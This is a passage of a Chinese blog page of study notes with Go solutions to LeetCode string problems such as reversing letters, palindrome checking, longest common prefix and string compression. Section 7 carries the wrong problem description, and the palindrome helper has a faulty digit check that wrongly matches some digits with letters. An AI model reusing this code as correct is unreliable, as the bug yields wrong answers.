data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9yZXZlcnNlLW9ubHktbGV0dGVycy9kZXNjcmlwdGlvbi8=\">https://leetcode.cn/problems/reverse-only-letters/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTJfU3RyaW5nL2xldmVsXzIvdG9waWNfMy5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/12_String/level_2/topic_3.go</span></p>\n<blockquote>\n<p>给你一个字符串  <code>s</code>  ，根据下述规则反转字符串：</p>\n<ul>\n<li>所有非英文字母保留在原有位置。</li>\n<li>所有英文字母（小写或大写）位置反转。</li>\n</ul>\n<p>返回反转后的  <code>s</code>  <em>。</em></p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">reverseOnlyLetters</span><span class=\"token punctuation\">(</span>s <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tans <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token function\">byte</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tw <span class=\"token operator\">:=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">--</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token char\">'z'</span> <span class=\"token operator\">||</span> s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token char\">'A'</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token char\">'Z'</span> <span class=\"token operator\">&amp;&amp;</span> s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token char\">'a'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t\t<span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token keyword\">for</span> w <span class=\"token operator\">&lt;</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">[</span>w<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token char\">'z'</span> <span class=\"token operator\">||</span> ans<span class=\"token punctuation\">[</span>w<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token char\">'A'</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">[</span>w<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token char\">'Z'</span> <span class=\"token operator\">&amp;&amp;</span> ans<span class=\"token punctuation\">[</span>w<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token char\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\tw<span class=\"token operator\">++</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\tans<span class=\"token punctuation\">[</span>w<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\tw<span class=\"token operator\">++</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"6-验证回文串\"><a class=\"anchor\" href=\"#6-验证回文串\">#</a> 6. 验证回文串</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy92YWxpZC1wYWxpbmRyb21lL2Rlc2NyaXB0aW9uLw==\">https://leetcode.cn/problems/valid-palindrome/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTJfU3RyaW5nL2xldmVsXzIvdG9waWNfNC5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/12_String/level_2/topic_4.go</span></p>\n<blockquote>\n<p>如果在将所有大写字符转换为小写字符、并移除所有非字母数字字符之后，短语正着读和反着读都一样。则可以认为该短语是一个 <strong>回文串</strong> 。</p>\n<p>字母和数字都属于字母数字字符。</p>\n<p>给你一个字符串  <code>s</code> ，如果它是 <strong>回文串</strong> ，返回  <code>true</code>  ；否则，返回  <code>false</code>  。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">isPalindrome</span><span class=\"token punctuation\">(</span>s <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tleft<span class=\"token punctuation\">,</span> right <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">for</span> left <span class=\"token operator\">&lt;</span> right <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token keyword\">for</span> left <span class=\"token operator\">&lt;</span> right <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token function\">isLetter</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span>left<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t\tleft<span class=\"token operator\">++</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token keyword\">for</span> left <span class=\"token operator\">&lt;</span> right <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token function\">isLetter</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span>right<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\tright<span class=\"token operator\">--</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token operator\">!</span><span class=\"token function\">sameByte</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span>left<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">[</span>right<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\tright<span class=\"token operator\">--</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\tleft<span class=\"token operator\">++</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">isLetter</span><span class=\"token punctuation\">(</span>a <span class=\"token builtin\">byte</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token comment\">// 48 57 65 90 97 122</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token comment\">// '0', '9', 'A', 'Z', 'a', 'z'</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token keyword\">if</span> a <span class=\"token operator\">>=</span> <span class=\"token char\">'a'</span> <span class=\"token operator\">&amp;&amp;</span> a <span class=\"token operator\">&lt;=</span> <span class=\"token char\">'z'</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token keyword\">if</span> a <span class=\"token operator\">>=</span> <span class=\"token char\">'A'</span> <span class=\"token operator\">&amp;&amp;</span> a <span class=\"token operator\">&lt;=</span> <span class=\"token char\">'Z'</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t<span class=\"token keyword\">if</span> a <span class=\"token operator\">>=</span> <span class=\"token char\">'0'</span> <span class=\"token operator\">&amp;&amp;</span> a <span class=\"token operator\">&lt;=</span> <span class=\"token char\">'9'</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">sameByte</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b <span class=\"token builtin\">byte</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t<span class=\"token keyword\">if</span> a <span class=\"token operator\">==</span> b <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token char\">'0'</span> <span class=\"token operator\">>=</span> a <span class=\"token operator\">&amp;&amp;</span> a <span class=\"token operator\">&lt;=</span> <span class=\"token char\">'9'</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t<span class=\"token keyword\">if</span> diff <span class=\"token operator\">:=</span> <span class=\"token function\">int</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token function\">int</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> diff <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">32</span> <span class=\"token operator\">||</span> diff <span class=\"token operator\">==</span> <span class=\"token number\">32</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"7-字符串中的第一个唯一字符\"><a class=\"anchor\" href=\"#7-字符串中的第一个唯一字符\">#</a> 7. 字符串中的第一个唯一字符</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy92YWxpZC1wYWxpbmRyb21lL2Rlc2NyaXB0aW9uLw==\">https://leetcode.cn/problems/valid-palindrome/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTJfU3RyaW5nL2xldmVsXzIvdG9waWNfNS5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/12_String/level_2/topic_5.go</span></p>\n<blockquote>\n<p>如果在将所有大写字符转换为小写字符、并移除所有非字母数字字符之后，短语正着读和反着读都一样。则可以认为该短语是一个 <strong>回文串</strong> 。</p>\n<p>字母和数字都属于字母数字字符。</p>\n<p>给你一个字符串  <code>s</code> ，如果它是 <strong>回文串</strong> ，返回  <code>true</code>  ；否则，返回  <code>false</code>  。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">firstUniqChar</span><span class=\"token punctuation\">(</span>s <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tlist <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token number\">26</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> v <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> s <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\tlist<span class=\"token punctuation\">[</span>v<span class=\"token operator\">-</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">++</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span> v <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> s <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> list<span class=\"token punctuation\">[</span>v<span class=\"token operator\">-</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> i</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"8-最长公共前缀\"><a class=\"anchor\" href=\"#8-最长公共前缀\">#</a> 8. 最长公共前缀</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9sb25nZXN0LWNvbW1vbi1wcmVmaXgvZGVzY3JpcHRpb24v\">https://leetcode.cn/problems/longest-common-prefix/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTJfU3RyaW5nL2xldmVsXzMvdG9waWNfMS5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/12_String/level_3/topic_1.go</span></p>\n<blockquote>\n<p>编写一个函数来查找字符串数组中的最长公共前缀。</p>\n<p>如果不存在公共前缀，返回空字符串  <code>&quot;&quot;</code> 。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">longestCommonPrefix</span><span class=\"token punctuation\">(</span>strs <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>strs<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> strs<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tminLen <span class=\"token operator\">:=</span> math<span class=\"token punctuation\">.</span>MaxInt32</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">var</span> ans <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> str <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> strs <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> minLen <span class=\"token operator\">></span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\tminLen <span class=\"token operator\">=</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> minLen<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\tfirstChar <span class=\"token operator\">:=</span> strs<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> str <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> strs <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> firstChar <span class=\"token operator\">!=</span> str<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">return</span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\tans <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">,</span> firstChar<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"9-压缩字符串\"><a class=\"anchor\" href=\"#9-压缩字符串\">#</a> 9. 压缩字符串</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9zdHJpbmctY29tcHJlc3Npb24v\">https://leetcode.cn/problems/string-compression/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTJfU3RyaW5nL2xldmVsXzMvdG9waWNfMi5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/12_String/level_3/topic_2.go</span></p>\n<blockquote>\n<p>给你一个字符数组  <code>chars</code>  ，请使用下述算法压缩：</p>\n<p>从一个空字符串  <code>s</code>  开始。对于  <code>chars</code>  中的每组 <strong>连续重复字符</strong> ：</p>\n<ul>\n<li>如果这一组长度为  <code>1</code>  ，则将字符追加到  <code>s</code>  中。</li>\n<li>否则，需要向  <code>s</code>  追加字符，后跟这一组的长度。</li>\n</ul>\n<p>压缩后得到的字符串  <code>s</code>  <strong>不应该直接返回</strong> ，需要转储到字符数组  <code>chars</code>  中。需要注意的是，如果组长度为  <code>10</code>  或  <code>10</code>  以上，则在  <code>chars</code>  数组中会被拆分为多个字符。</p>\n<p>请在 <strong>修改完输入数组后</strong> ，返回该数组的新长度。</p>\n<p>你必须设计并实现一个只使用常量额外空间的算法来解决此问题。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">compress</span><span class=\"token punctuation\">(</span>chars <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>chars<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tpre<span class=\"token punctuation\">,</span> write <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>chars<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> i <span class=\"token operator\">==</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>chars<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token operator\">||</span> chars<span class=\"token punctuation\">[</span>pre<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> chars<span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\tchars<span class=\"token punctuation\">[</span>write<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> chars<span class=\"token punctuation\">[</span>pre<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\twrite<span class=\"token operator\">++</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\tcount <span class=\"token operator\">:=</span> i <span class=\"token operator\">-</span> pre <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> count <span class=\"token operator\">></span> <span class=\"token number\">1</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\t\ttempWrite <span class=\"token operator\">:=</span> write</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">for</span> count <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t\t\tchars<span class=\"token punctuation\">[</span>write<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token char\">'0'</span> <span class=\"token operator\">+</span> <span class=\"token function\">byte</span><span class=\"token punctuation\">(</span>count<span class=\"token operator\">%</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t\t\t\tcount <span class=\"token operator\">/=</span> <span class=\"token number\">10</span></pre></td></tr><tr><td 